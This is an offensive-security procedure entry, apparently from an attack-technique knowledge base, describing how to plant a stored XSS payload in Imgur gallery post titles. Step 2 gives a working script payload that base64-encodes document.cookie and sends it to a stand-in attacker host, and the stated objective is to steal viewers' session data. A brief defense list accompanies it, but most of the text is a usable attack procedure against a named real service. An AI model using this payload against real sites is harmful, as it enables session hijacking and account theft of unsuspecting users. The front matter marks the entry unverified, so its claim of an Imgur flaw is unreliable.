---
id: b2c3d4e5-f6g7-8901-bcde-f23456789012
tags:
  - xss
  - stored-xss
  - payload-injection
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:52:49.992Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Create-Malicious-Gallery-Post-with-XSS-Payload

## Summary

This procedure involves creating an Imgur gallery post with a malicious JavaScript payload in the title field, exploiting insufficient sanitization to store the XSS for later execution when viewed by others.

## Description

In the context of Imgur's platform, the post title is stored and rendered without proper HTML escaping in the gallery page's `<title>` and meta tags. An attacker with an Imgur account can upload a gallery and inject a script tag in the title, such as one that exfiltrates cookies to a controlled server. This sets up a stored XSS attack targeting any viewer, potentially leading to session hijacking. Prerequisites include a valid Imgur account and basic knowledge of JavaScript payloads.

## Requirements

1. Valid Imgur user account for authentication and posting
2. Web browser to access https://imgur.com/upload
3. Controlled server or endpoint to receive exfiltrated data (e.g., http://attacker.com/steal)

## Defense

Defensive measures and detection strategies:

- Implement strict input sanitization and HTML escaping for all user-controlled fields, including titles
- Use Content Security Policy (CSP) to restrict script execution on gallery pages
- Monitor for anomalous network requests from gallery views to external domains

## Objectives

1. Store malicious JavaScript in the post title without triggering sanitization
2. Generate a shareable gallery URL containing the payload
3. Prepare for execution in victim browsers to steal session data

## Instructions

### Step 1: Log In and Navigate to Upload

**Context**: Authenticate to Imgur and access the gallery creation interface to prepare for payload injection.

Log in to https://imgur.com and click on the upload button to start a new gallery post.

> Expected output: Upload interface loaded, ready for image selection and title entry.

### Step 2: Inject XSS Payload in Title

**Context**: Enter the malicious payload in the title field during post submission, ensuring it evades any client-side validation.

Select or upload an image to the gallery, then in the title field, input: `<script>fetch('http://attacker.com/steal?cookie='+btoa(document.cookie));</script>`. Complete the post submission.

> This payload base64-encodes and sends cookies to the attacker's server. Expected output: Post created successfully; gallery URL like https://imgur.com/gallery/Y5JUzv3 generated.

### Step 3: Verify Payload Storage

**Context**: Confirm the payload is stored by inspecting the gallery page source without executing it.

View the gallery in a safe environment (e.g., incognito mode with JS disabled) and inspect the HTML source for the unsanitized title in `<title>` and meta tags.

> Expected output: Raw script tag visible in HTML source, confirming storage.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[stored-xss]]
- [[payload-injection]]
